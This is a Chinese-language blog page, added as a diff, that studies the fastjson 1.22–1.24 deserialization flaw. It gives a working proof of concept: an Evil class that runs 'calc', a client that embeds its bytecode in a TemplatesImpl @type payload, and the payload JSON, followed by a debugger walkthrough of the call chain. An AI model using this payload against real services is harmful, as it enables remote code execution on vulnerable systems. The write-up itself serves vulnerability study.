@@ -1,0 +1,688 @@
+<!DOCTYPE html>
+
+
+<html lang="zh-CN">
+  
+
+    <head>
+      <meta charset="utf-8" />
+        
+      <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=1"
+      />
+      <title>fastjson1.22-1.24反序列化 |  Hexo</title>
+  <meta name="generator" content="hexo-theme-ayer">
+      
+      <link rel="shortcut icon" href="/favicon.ico" />
+       
+<link rel="stylesheet" href="/dist/main.css">
+
+      
+<link rel="stylesheet" href="/css/fonts/remixicon.css">
+
+      
+<link rel="stylesheet" href="/css/custom.css">
+ 
+      <script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script>
+       
+ 
+
+      <link
+        rel="stylesheet"
+        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
+      />
+      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>
+
+      <!-- mermaid -->
+      
+      <style>
+        .swal2-styled.swal2-confirm {
+          font-size: 1.6rem;
+        }
+      </style>
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+</head>
+  </html>
+</html>
+
+
+<body>
+  <div id="app">
+    
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-fastjson1-22templates"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  fastjson1.22-1.24反序列化
+</h1>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2022/04/27/fastjson1-22templates/" class="article-date">
+  <time datetime="2022-04-27T07:39:56.000Z" itemprop="datePublished">2022-04-27</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/javaSec/">javaSec</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">1.8k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">8 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h1 id="fastjson基础"><a href="#fastjson基础" class="headerlink" title="fastjson基础"></a>fastjson基础</h1><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><h2 id="什么是fastjson"><a href="#什么是fastjson" class="headerlink" title="什么是fastjson"></a>什么是fastjson</h2><ol>
+<li>fastjson 是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean</li>
+<li>FastJson 与 Google 的 Gson 都是解析 Json 的强者，两者不相伯仲</li>
+<li><a target="_blank" rel="noopener" href="https://github.com/alibaba/fastjson" title="https://github.com/alibaba/fastjson">https://github.com/alibaba/fastjson</a></li>
+<li>fastjson 会不定期发布针对 android 版本优化的版本，android优化版本是去掉不必要的代码，减少体积，功能和标准版本基本一样。 已发布的android版本包括：<a target="_blank" rel="noopener" href="http://repo1.maven.org/maven2/com/alibaba/fastjson/1.1.51.android/">http://repo1.maven.org/maven2/com/alibaba/fastjson/1.1.51.android/</a><br /></li>
+</ol>
+<p>maven配置一下依赖就能开始用</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">1.2</span><span class="number">.49</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="Map转JSON字符串"><a href="#Map转JSON字符串" class="headerlink" title="Map转JSON字符串"></a>Map转JSON字符串</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fastjson.demo1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">map2json</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        HashMap&lt;Object, Object&gt; map1 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map1.put(<span class="string">&quot;key1&quot;</span>, <span class="string">&quot;value1&quot;</span>);</span><br><span class="line">        map1.put(<span class="string">&quot;key2&quot;</span>,<span class="string">&quot;value2&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> JSON.toJSONString(map1);</span><br><span class="line">        System.out.println(jsonString);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220420143036-shht8mn.png" alt="image.png"></p>
+<h1 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h1><h2 id="POJO-List-转-JSON-字符串"><a href="#POJO-List-转-JSON-字符串" class="headerlink" title="POJO List 转 JSON 字符串"></a>POJO List 转 JSON 字符串</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fastjson.demo1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.fastjson.basic.Person;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">pojolist2json</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">mike</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Mike&quot;</span>, <span class="number">19</span>);</span><br><span class="line">        <span class="type">Person</span> <span class="variable">nancy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Nancy&quot;</span>, <span class="number">18</span>);</span><br><span class="line"></span><br><span class="line">        ArrayList&lt;Person&gt; persons = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        persons.add(mike);</span><br><span class="line">        persons.add(nancy);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> JSON.toJSONString(persons);</span><br><span class="line">        System.out.println(jsonString);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220420144603-wtodusg.png" alt="image.png">1</p>
+<h2 id="Json-字符串转-JsonObject"><a href="#Json-字符串转-JsonObject" class="headerlink" title="Json 字符串转 JsonObject"></a>Json 字符串转 JsonObject</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fastjson.demo1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">json2jsonObj</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;name1\&quot;:\&quot;mike\&quot;,\&quot;name2\&quot;:\&quot;john\&quot;,\&quot;key1\&quot;:123&#125;&quot;</span>;</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">object</span> <span class="operator">=</span> JSON.parseObject(jsonString);</span><br><span class="line">        System.out.println(object.getString(<span class="string">&quot;name1&quot;</span>));</span><br><span class="line">        System.out.println(object.getInteger(<span class="string">&quot;key1&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220420145133-0jcinsv.png" alt="image.png"></p>
+<h1 id="Fastjson1-22-1-24反序列化"><a href="#Fastjson1-22-1-24反序列化" class="headerlink" title="Fastjson1.22-1.24反序列化"></a>Fastjson1.22-1.24反序列化</h1><h1 id="TEMPLATESIMPL环境-amp-复现"><a href="#TEMPLATESIMPL环境-amp-复现" class="headerlink" title="TEMPLATESIMPL环境&amp;复现"></a>TEMPLATESIMPL环境&amp;复现</h1><p>jdk 1.8<br>fastjson 1.22</p>
+<p>先编写一个恶意类Evil，编译为class文件后放在本地，我们需要他的字节码</p>
+<p>这个类的构造方法中会<code>Runtime.getRuntime().exec(&quot;calc&quot;);</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fastjson.exploit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Evil</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">Evil</span> <span class="variable">helloworld</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Evil</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>再<del>编写</del>（网上找了）一个调用了触发漏洞方法的客户端</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fastjson.exploit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.IOUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.codec.binary.Base64;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">poc1</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">readClass</span><span class="params">(String cls)</span>&#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            IOUtils.copy(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(cls)), bos);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> Base64.encodeBase64String(bos.toByteArray());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">bad_method</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">ParserConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ParserConfig</span>();</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">fileSeparator</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;file.separator&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">evil_path</span> <span class="operator">=</span> <span class="string">&quot;C:\\Users\\AEQAQ\\Desktop\\gc-tool\\fasjJ1\\target\\classes\\com\\fastjson\\exploit\\Evil.class&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">evil_code</span> <span class="operator">=</span> readClass(evil_path);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">NASTY_CLASS</span> <span class="operator">=</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">text1</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS +</span><br><span class="line">                <span class="string">&quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+evil_code+<span class="string">&quot;\&quot;],&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#x27;_name&#x27;:&#x27;a.b&#x27;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#x27;_tfactory&#x27;:&#123; &#125;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;_outputProperties\&quot;:&#123; &#125;&#125;\n&quot;</span>;</span><br><span class="line">        System.out.println(text1);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> &#123;</span><br><span class="line">        bad_method();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个客户端做的事情也很简单：</p>
+<ol>
+<li><p>读取class文件，并将其base64编码</p>
+</li>
+<li><p>创建json字符串 text1，其中<code>@type</code>设置为我们很熟悉的类<code>TemplatesImpl</code></p>
+</li>
+<li><p><code>JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);</code></p>
+<p> 这是漏洞触发的核心点</p>
+</li>
+<li><p>这里我们转化为对象的字符串，也就是包含了恶意class的字符串为</p>
+ <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;_bytecodes&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;yv66vgAA...(省略一大段base64)&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">&#x27;_name&#x27;<span class="punctuation">:</span>&#x27;a.b&#x27;<span class="punctuation">,</span></span><br><span class="line">&#x27;_tfactory&#x27;<span class="punctuation">:</span><span class="punctuation">&#123;</span> <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;_outputProperties&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span> <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></li>
+</ol>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220422202449-m5xmuiz.png" alt="image.png"></p>
+<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><blockquote>
+<p>通过最简单的利用TemplatesImpl反序列化来学习fastjson1.22-1.24漏洞</p>
+</blockquote>
+<p>在<code>JSON.parseObject</code>处打上断点，下面主要分析这个方法中的流程</p>
+<p>不得不说，这个调用还挺长的，所以我写的尽量详细点，对其中的一些方法和算法单独列出来分析，为以后回来看或者分析其他组件提供经验（吧。。）。</p>
+<p>Fastjson反序列化的类方法调用关系</p>
+<p>在这条利用TemplateImpl的利用链中，主要牵扯的还是靠左边的Deserializer</p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220422200212-mraj3zc.png" alt="image.png"></p>
+<h2 id="JSON-parseObject"><a href="#JSON-parseObject" class="headerlink" title="JSON.parseObject"></a>JSON.parseObject</h2><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220422230857-4dz2cq4.png" alt="image.png"></p>
+<p>先会对Feature数组进行遍历，并对mask值进行或运算，这里mask是有初值的，并将结果赋值给featureValues</p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220422231234-7m5244f.png" alt="image.png"></p>
+<p>接着会返回一个DefaultJSONParser对象</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">DefaultJSONParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultJSONParser</span>(input, config, featureValues);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220422233123-exoj21l.png" alt="image.png"></p>
+<p>可以看到我们的json字符串和features都被保存在这个parser里</p>
+<p>其中lexer字段是一个JSONScanner对象，这里我们分析一下DefaultJSONParser对象的构造方法</p>
+<h2 id="DefaultJSONParser构造方法"><a href="#DefaultJSONParser构造方法" class="headerlink" title="DefaultJSONParser构造方法"></a>DefaultJSONParser构造方法</h2><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220422233653-k3i7ci4.png" alt="image.png"></p>
+<p>可以看到这个构造方法中，根据我们传入的input和features，会先构造一个JSONScanner对象</p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220422234656-vtdedwz.png" alt="image.png"></p>
+<p>这里由于ch是”{“，所以设置token为12</p>
+<h2 id="DefaultJSONParser-parseObject-Type-type-Object-fieldName"><a href="#DefaultJSONParser-parseObject-Type-type-Object-fieldName" class="headerlink" title="DefaultJSONParser.parseObject(Type type,Object fieldName)"></a>DefaultJSONParser.parseObject(Type type,Object fieldName)</h2><p>接着调用parseObject方法，继续跟进</p>
+<p>先返回token，这里为12，然后进到具体的处理部分</p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220422233500-7oc40xw.png" alt="image.png"></p>
+<p>先返回一个derializer，然后再调用它其中的方法</p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220422235022-h4b5mcx.png" alt="image.png"></p>
+<h2 id="JavaObjectDeserializer-deserialze"><a href="#JavaObjectDeserializer-deserialze" class="headerlink" title="JavaObjectDeserializer.deserialze"></a>JavaObjectDeserializer.deserialze</h2><p><code>com.alibaba.fastjson.parser.deserializer.JavaObjectDeserializer.deserialze</code></p>
+<p>因此我们跟进deserialize方法</p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220422235206-fn6d1d1.png" alt="image.png"></p>
+<p>由于<code>parser.parseObject(clazz, (Object)null);</code>中传入的是Object类，所以这里跳过了if判断，直接进到return那一句里</p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220422235523-fkrunuq.png" alt="image.png"></p>
+<p>三元运算为false，进到<code>DefaultJSONParser.parse</code>方法中</p>
+<h2 id="DefaultJSONParser-parse-java-lang-Object"><a href="#DefaultJSONParser-parse-java-lang-Object" class="headerlink" title="DefaultJSONParser.parse(java.lang.Object)"></a>DefaultJSONParser.parse(java.lang.Object)</h2><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220422235639-3b45azg.png" alt="image.png"></p>
+<p>最终会进到case 12里面</p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220423001637-lxvvcqs.png" alt="image.png"></p>
+<p>然后调用<code>DefaultJSONParser.parseObject</code>方法</p>
+<h2 id="DefaultJSONParser-parseObject-java-util-Map-java-lang-Object"><a href="#DefaultJSONParser-parseObject-java-util-Map-java-lang-Object" class="headerlink" title="DefaultJSONParser.parseObject(java.util.Map, java.lang.Object)"></a>DefaultJSONParser.parseObject(java.util.Map, java.lang.Object)</h2><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220423024252-2ecqiry.png" alt="image.png"></p>
+<p>因为在DefaultJSONParser的构造方法中已经调用过一次next方法了，所以现在的ch是<code>&quot;</code>,34，所以会进到这个判断</p>
+<p>scanSymbol则会取出<code>&quot;</code>之间的数据</p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220423002323-z2uqm4h.png" alt="image.png"></p>
+<p>取出json对象的第一个key，也就是<code>@type</code></p>
+<blockquote>
+<p>还记得json中的<code>@type</code>所对应的数据是<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>，也就是我们要实例化的恶意类的类名。</p>
+</blockquote>
+<p>加载了TemplateImpl类</p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220423002549-grnww83.png" alt="image.png"></p>
+<p>然后接着往下走，就进入这个地方</p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220426005938-jjbq5e5.png" alt="image.png"></p>
+<p>这里先通过scanSymbol来获取到<code>&quot;</code>间的数据，然后用<code>TypeUtils.loadClass</code>方法来加载这个类</p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220426010128-2jlc4wl.png" alt="image.png"></p>
+<p>最后在这个方法中实例化恶意类</p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220426010227-ot3k7ef.png" alt="image.png"></p>
+<h2 id="JavaBeanDeserializer-deserialze"><a href="#JavaBeanDeserializer-deserialze" class="headerlink" title="JavaBeanDeserializer.deserialze"></a>JavaBeanDeserializer.deserialze</h2><p>根据token为16，会先进到<code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#parseField</code>方法中</p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220427150433-agbqxc9.png" alt="image.png"></p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220427150720-5xqscvg.png" alt="image.png"></p>
+<p>随后进入到<code>com.alibaba.fastjson.parser.deserializer.DefaultFieldDeserializer#parseField</code>中，此处filedType判断为了这个<code>class [[B</code>类型，然后再进入到下面的deserialze方法中</p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220427150930-3ctd6md.png" alt="image.png"></p>
+<p>然后就取出了bytecodes字段<img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220427151148-ymejgk5.png" alt="image.png"></p>
+<p>进入这个setValue方法中，可以看到传入的object就是TempaltesImpl对象，然后value即构造的恶意字节码</p>
+<p><code>com.alibaba.fastjson.parser.deserializer.FieldDeserializer#setValue(java.lang.Object, java.lang.Object)</code></p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220427151238-g8t7y7s.png" alt="image.png"></p>
+<p>通过这个方法把<code>_bytecodes</code>加入到TemplatesImpl对象中</p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220427151455-vtm7tif.png" alt="image.png"></p>
+<p>然后他会通过这个parseFiled方法逐个取出parser也就是json中的字段名<img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220427152148-xeeq7iv.png" alt="image.png"></p>
+<p>直到解析这个字段，也就是<code>_outputProperties</code></p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220427152330-rsou476.png" alt="image.png"></p>
+<p>最后在<code>com.alibaba.fastjson.parser.deserializer.FieldDeserializer#setValue(java.lang.Object, java.lang.Object)</code>中反射调用getOutputProperties方法，完成整个调用链调用，因为这里传入的object就是我们构造的恶意TemplatesImpl对象，这条攻击链可以在7d21中找到</p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220427153527-ier6p5m.png" alt="image.png"></p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>版权声明： </strong>
+          
+          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
